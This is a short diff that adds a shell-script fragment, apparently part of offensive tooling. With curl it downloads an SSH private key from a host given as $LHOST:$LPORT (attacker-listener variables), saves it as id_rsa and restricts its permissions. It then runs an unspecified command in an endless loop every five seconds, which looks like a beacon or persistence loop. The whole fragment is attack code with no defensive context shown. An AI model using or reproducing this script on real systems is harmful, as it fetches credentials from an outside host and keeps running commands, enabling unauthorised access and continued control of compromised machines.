@@ -1,0 +1,6 @@
+curl -s http://$LHOST:$LPORT/key.$SSHUSER.txt -o id_rsa
+chmod 400 id_rsa
+while true ; do
+    $LCMD
+    sleep 5
+done
